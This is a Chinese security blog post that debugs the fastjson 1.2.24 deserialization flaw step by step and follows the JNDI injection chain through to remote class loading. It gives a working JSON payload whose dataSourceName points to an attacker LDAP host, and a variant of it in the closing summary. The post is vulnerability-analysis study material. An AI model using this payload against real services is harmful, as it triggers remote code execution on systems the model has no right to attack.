

<!DOCTYPE html>
<html lang="" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="jndi注入原理学习">
<meta property="og:type" content="article">
<meta property="og:title" content="fastjson1.2.24反序列化jndi注入利用调试跟进">
<meta property="og:url" content="http://novysodope.github.io/2021/03/11/57/index.html">
<meta property="og:site_name" content="novy&#39;s Blog">
<meta property="og:description" content="jndi注入原理学习">
<meta property="og:locale">
<meta property="og:image" content="http://novysodope.github.io/images/57/1.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/2.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/3.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/4.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/5.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/6.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/7.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/8.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/9.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/10.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/11.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/12.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/13.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/14.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/15.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/16.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/17.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/18.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/19.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/20.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/21.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/22.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/23.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/24.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/25.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/26.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/27.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/28.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/29.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/30.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/31.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/32.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/33.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/34.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/35.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/36.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/37.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/38.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/39.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/40.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/41.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/42.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/43.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/44.png">
<meta property="og:image" content="http://novysodope.github.io/images/57/45.png">
<meta property="article:published_time" content="2021-03-11T02:14:21.000Z">
<meta property="article:modified_time" content="2021-08-30T02:26:00.228Z">
<meta property="article:author" content="novy">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="fastjson反序列化">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://novysodope.github.io/images/57/1.png">
  
  <title>fastjson1.2.24反序列化jndi注入利用调试跟进 - novy&#39;s Blog</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
  



<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />



  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"novysodope.github.io","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6,h7,h8,h9","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":"a6c1581442f57290135c4581f8de49ff","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>novy&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                首页
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                归档
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                分类
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                标签
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                关于
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                友情链接
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="fastjson1.2.24反序列化jndi注入利用调试跟进">
              
            </span>

            
              <div class="mt-3">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-author" aria-hidden="true"></i>
      novy
    </span>
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-03-11 10:14" pubdate>
        March 11, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      3.8k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      12 分钟
    </span>
  

  
  
    

      <span id="busuanzi_container_page_pv" style="display: none">
        <i class="iconfont icon-eye" aria-hidden="true"></i>
        <span id="busuanzi_value_page_pv"></span> 次
      </span>
    
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">fastjson1.2.24反序列化jndi注入利用调试跟进</h1>
            
            <div class="markdown-body">
              <p>一直对jndi注入只有个大概的认识，今天学习一下原理，从fj反序列化漏洞入手调试学习<br>Payload</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.43.147:1389/o=reference&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;&#125;<br></code></pre></div></td></tr></table></figure>
<p>前面参数传递省略，分两个部分跟进</p>
<h1 id="0x01-Fastjson反序列化实现流程跟进"><a href="#0x01-Fastjson反序列化实现流程跟进" class="headerlink" title="0x01.Fastjson反序列化实现流程跟进"></a>0x01.Fastjson反序列化实现流程跟进</h1><p><img src="/images/57/1.png" srcset="/img/loading.gif" lazyload><br>当参数第一个字符为<code>&#123;</code>时进入<code>case 12</code><br><img src="/images/57/2.png" srcset="/img/loading.gif" lazyload><br>跟进<code>DefaultJSONParser.parseObject</code><br>随后判断参数如果{的后面是双引号，就使用<code>scanSymbol</code>方法获取双引号里的内容<br><img src="/images/57/3.png" srcset="/img/loading.gif" lazyload><br>跟进<code>JSONLexerBase.scanSymbol</code><br>开始获取双引号里的内容，扫描传来的值获取key<br><img src="/images/57/4.png" srcset="/img/loading.gif" lazyload><br><img src="/images/57/5.png" srcset="/img/loading.gif" lazyload><br><code>Key</code>为<code>@type</code><br><img src="/images/57/6.png" srcset="/img/loading.gif" lazyload><br>回到<code>JSONLexerBase.scanSymbol</code><br>具体为计算长度，根据长度来获取对应位置的字符，在<code>JSONScanner.next</code>方法中index为双引号开始部分，经过不断遍历，此时index为7，也就是扫描从双引号开始第7位字符的符号，<br><img src="/images/57/7.png" srcset="/img/loading.gif" lazyload><br>再次得到双引号，符合条件跳出循环<br><img src="/images/57/8.png" srcset="/img/loading.gif" lazyload><br>最终拿到双引号里的<code>@type</code>符合条件后进入下一步<br><img src="/images/57/9.png" srcset="/img/loading.gif" lazyload><br>开始扫描下一个双引号里的字符<br><img src="/images/57/10.png" srcset="/img/loading.gif" lazyload><br>经过像上一步一样的操作最终得到<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="/images/57/11.png" srcset="/img/loading.gif" lazyload><br>返回上一层进入下一步<br><img src="/images/57/12.png" srcset="/img/loading.gif" lazyload><br>此处为取得一些基础类，进入<code>loadclass</code>方法<br><img src="/images/57/13.png" srcset="/img/loading.gif" lazyload><br>mappings是当前类加载器的缓存（相当于是一个容器，classname是key，根据key从容器取出class对象），此处想要从缓存里取出<code>com.sun.rowset.JdbcRowSetImpl</code>，但是<code>mappings</code>不存在这个对象<br><img src="/images/57/14.png" srcset="/img/loading.gif" lazyload><br>所以开始下一步的判断，从获取到的<code>ClassName</code>看到第一位字符为c，所以绕过第一个及第二个if进入到try<br><img src="/images/57/15.png" srcset="/img/loading.gif" lazyload><br><code>Classloader</code>为空不满足条件，继续下一个<code>try</code><br><img src="/images/57/16.png" srcset="/img/loading.gif" lazyload><br>将<code>com.sun.rowset.JdbcRowSetImpl</code>一系列操作后缓存到<code>mappings</code>里，此时<code>clazz</code>为<code>com.sun.rowset.JdbcRowSetImpl</code>，满足前面<code>clazz</code>不为空的条件<br><img src="/images/57/17.png" srcset="/img/loading.gif" lazyload><br><img src="/images/57/18.png" srcset="/img/loading.gif" lazyload><br><img src="/images/57/19.png" srcset="/img/loading.gif" lazyload><br>即<br><img src="/images/57/20.png" srcset="/img/loading.gif" lazyload><br>然后通过<code>getDeserializer</code>方法得到clazz对象所有参数<br><img src="/images/57/21.png" srcset="/img/loading.gif" lazyload><br>跟进<code>getDeserializer</code>往下走<br>在<code>getFieId</code>方法里会使用到反射加载的方式来获取对象的<code>set</code>、<code>get</code>方法<br><img src="/images/57/22.png" srcset="/img/loading.gif" lazyload><br>获取完对象后开始反序列化<br><img src="/images/57/23.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="总结流程为："><a href="#总结流程为：" class="headerlink" title="总结流程为："></a>总结流程为：</h2><p>遍历传入的json，取出对应的内容（对象、对象参数）-&gt;获取取出的对象的所有set、get方法-&gt;根据取得的内容做反序列化</p>
<h1 id="0x02-Jndi注入跟进"><a href="#0x02-Jndi注入跟进" class="headerlink" title="0x02.Jndi注入跟进"></a>0x02.Jndi注入跟进</h1><p>流程走到<br><code>com.sun.rowset.JdbcRowSetImpl#connect</code><br><img src="/images/57/24.png" srcset="/img/loading.gif" lazyload><br>这里的参数<code>dataSourceName</code>是在前面反序列化时反射加载得到的<code>setter</code>方法<code>setDataSourceName(String name)</code>中设置的，由于可控所以满足jndi注入的条件，此时<code>dataSourceName</code>的值为前面传来的<code>ldap://192.168.43.147:1389/o=reference</code>，再用<code>lookup</code>查找传来的数据源从而进行调用<br>跟进lookup方法看具体实现</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.InitialContext#lookup<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/25.png" srcset="/img/loading.gif" lazyload><br><code>getURLOrDefaultInitCtx</code>函数会分析传来的<code>name</code>的协议头然后返回对应协议的<code>Context</code>对象子类，然后在对应协议处理对象中去<code>lookup</code>搜索<br>跟进<code>getURLOrDefaultInitCtx </code></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.InitialContext#getURLOrDefaultInitCtx<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/26.png" srcset="/img/loading.gif" lazyload><br>跟进<code>getURLContext</code>查看对协议的处理</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.NamingManager#getURLContext<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/27.png" srcset="/img/loading.gif" lazyload><br>此处协议是ldap所以返回<code>GenericURLDirContext</code>对象的子类<code>ldapURLContext</code>，继续跟进<code>lookup</code></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.url.ldap.ldapURLContext#lookup<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/28.png" srcset="/img/loading.gif" lazyload><br>往上跟到父类的<code>lookup</code></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.toolkit.url.GenericURLContext#lookup<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/29.png" srcset="/img/loading.gif" lazyload><br>具体链为</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.url.ldap.ldapURLContext#getRootURLContext-&gt; <br>com.sun.jndi.url.ldap.ldapURLContextFactory#getUsingURLIgnoreRootDN-&gt; <br>javax.naming.spi.ResolveResult#ResolveResult-&gt;<br>…<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/30.png" srcset="/img/loading.gif" lazyload><br>回到<code>lookup</code>方法，<br><img src="/images/57/31.png" srcset="/img/loading.gif" lazyload><br>调用注册中心的<code>lookup</code>方法去查找传来的<code>name</code>（此处的<code>remainingName</code>即传来的恶意类）<br>流程走到</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.jndi.ldap.LdapCtx#c_lookup<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/32.png" srcset="/img/loading.gif" lazyload><br>获取对象实例，跟进<code>getObjectInstance</code></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.spi.DirectoryManager#getObjectInstance<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/33.png" srcset="/img/loading.gif" lazyload><br>由于<br><code>javax.naming.spi.NamingManager#getObjectFactoryBuilder</code>的属性为null，所以跳过此处判断<br><img src="/images/57/34.png" srcset="/img/loading.gif" lazyload><br>回到<code>DirectoryManager</code>类，往下走<br><img src="/images/57/35.png" srcset="/img/loading.gif" lazyload><br>判断<code>refinfo</code>是否为<code>Reference</code>的实例对象，将恶意类封装到<code>ref</code>中<br>，往下走<br><img src="/images/57/36.png" srcset="/img/loading.gif" lazyload><br>，获取封装到<code>ref</code>对象的类名，随后到<code>Reference</code>里加载传来的<code>ref</code>，跟进<code>getObjectFactoryFromReference</code>查看具体实现</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">javax.naming.spi.NamingManager#getObjectFactoryFromReference<br></code></pre></div></td></tr></table></figure>
<p>尝试从本地加载<code>Factory</code>类：<br><img src="/images/57/37.png" srcset="/img/loading.gif" lazyload><br>如果本地不存在此类，则会从<code>codebase</code>中加载：<br><img src="/images/57/38.png" srcset="/img/loading.gif" lazyload><br>跟进<code>loadclass</code>方法，</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.naming.internal.VersionHelper<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/39.png" srcset="/img/loading.gif" lazyload><br>这是一个抽象类，由于抽象类不能被直接实例化，所以我们跟进到他的子类的<code>loadclass</code>方法</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">com.sun.naming.internal.VersionHelpe12#loadclass<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/40.png" srcset="/img/loading.gif" lazyload><br>进入到<code>forname</code></p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">java.lang.class#forname<br></code></pre></div></td></tr></table></figure>
<p>由于<code>security</code>属性为<code>null</code>所以跳过安全检查直接返回对象<br><img src="/images/57/41.png" srcset="/img/loading.gif" lazyload><br>回到<code>VersionHelpe12#loadclass</code>，最后通过<code>URLClassLoader</code>从远程动态加载恶意类：<br><img src="/images/57/42.png" srcset="/img/loading.gif" lazyload><br>此处的<code>getUrlArray</code>方法为父类的解析实现</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">VersionHelper#getUrlArray<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/43.png" srcset="/img/loading.gif" lazyload><br>回到<code>Javax.naming.spi.NamingManager#getObjectFactoryFromReference</code><br>实例化<code>URLClassLoader</code>从远程动态加载的恶意类，从而加载恶意代码触发命令：<br><img src="/images/57/44.png" srcset="/img/loading.gif" lazyload><br>实例化调用链如下</p>
<figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">Java.lang.class#newInstance-&gt;<br>java.lang.reflect.Constructor#newInstance-&gt;<br>sun.reflect.DelegatingConstructorAccessorImpl#newInstance-&gt;<br>sun.reflect.NativeConstructorAccessorImpl#newInstance-&gt;<br>sun.reflect.NativeConstructorAccessorImpl#newInstance0<br></code></pre></div></td></tr></table></figure>
<p><img src="/images/57/45.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="总结流程为：-1"><a href="#总结流程为：-1" class="headerlink" title="总结流程为："></a>总结流程为：</h2><p>获取数据源-&gt;获取参数协议头，根据获取的协议进入对应的处理方法-&gt;加载factory对象-&gt;实例化获取的对象</p>
<h1 id="总结fastjson漏洞原理："><a href="#总结fastjson漏洞原理：" class="headerlink" title="总结fastjson漏洞原理："></a>总结fastjson漏洞原理：</h1><p>fastjson是根据json内容转为对应的javabean，即fastjson会取得json中的类及类的参数进行反序列化，由于json可控，攻击者可以自定义类及类的参数，所以fastjson在获取攻击者传入的对象的set、get方法时会根据攻击者传入的json来进行设定set方法的值，最后在反序列化时触发漏洞。拿jndi注入来说，攻击者传入json内容<code>&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.83.11:1389/o=tomcat&quot;,&quot;autoCommit&quot;:true&#125;</code>，fastjson首先会取得JdbcRowSetImpl类，在取JdbcRowSetImpl类的所有set、get方法时会将数据源ldap://192.168.83.11:1389/o=tomcat当作setDataSourceName的值来设定，最后在还原成JdbcRowSetImpl时就会去加载该数据源从而加载远程恶意类达到攻击目的。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a target="_blank" rel="noopener" href="https://kingx.me/Exploit-Java-Deserialization-with-RMI.html">深入理解JNDI注入与Java反序列化漏洞利用</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6633">JNDI注入原理及利用</a></li>
</ul>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
                    
                      <a class="hover-with-bg" href="/tags/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">fastjson反序列化</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    声明：<br>   本文章用于学习交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意本声明。<br> <br> Disclaimer: <br>   This article is for study and communication. It is strictly forbidden to use it for illegal operations. All consequences shall be borne by yourself. Reading this article means that you have agreed to this statement.
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/05/19/55/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">ysoserial URLDNS  gadget分析笔记</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/01/12/47/">
                        <span class="hidden-mobile">.getBean("") .callMethod("")的思路</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->

  <div class="col-lg-7 mx-auto nopadding-x-md">
    <div class="container custom post-custom mx-auto">
      <img src="/img/aa.png" srcset="/img/loading.gif" lazyload class="rounded mx-auto d-block mt-5" style="width:150px; height:150px;"><p></p> <p style="text-align:center"><span>扫一扫关注我们</span></p>
    </div>
  </div>


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     © 2018-<script type="text/javascript">document.write(new Date().getFullYear());</script> <span> <a href="#" target="_blank" rel="nofollow noopener"><font color="#2ca6cb">novy`s Blog</font>.</a> </span> Powered by <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span><font color="#2ca6cb">Hexo</font></span></a><p><script> function secondToDate(second) { if (!second) { return 0; } var time = new Array(0, 0, 0, 0, 0); if (second >= 365 * 24 * 3600) { time[0] = parseInt(second / (365 * 24 * 3600)); second %= 365 * 24 * 3600; } if (second >= 24 * 3600) { time[1] = parseInt(second / (24 * 3600)); second %= 24 * 3600; } if (second >= 3600) { time[2] = parseInt(second / 3600); second %= 3600; } if (second >= 60) { time[3] = parseInt(second / 60); second %= 60; } if (second > 0) { time[4] = second; } return time; }</script> <script type="text/javascript" language="javascript"> function setTime() { var create_time = Math.round(new Date(Date.UTC(2018, 11, 09, 6, 6, 6)).getTime() / 1000); var timestamp = Math.round((new Date().getTime() + 8 * 60 * 60 * 1000) / 1000); currentTime = secondToDate((timestamp - create_time)); currentTimeHtml = currentTime[0] + "年" + currentTime[1] + "天" + currentTime[2] + "时" + currentTime[3] + "分" + currentTime[4] + "秒"; document.getElementById("htmer_time").innerHTML = currentTimeHtml; }    setInterval(setTime, 1000);</script> 本博客已经稳定运行：<span id="htmer_time" style="color: #2ca6cb;"></span> <br/> <script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

你是第<font color="#2ca6cb"><span id="busuanzi_value_site_uv"></span></font>个小伙伴 </p> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  
    <!-- Baidu Analytics -->
    <script defer>
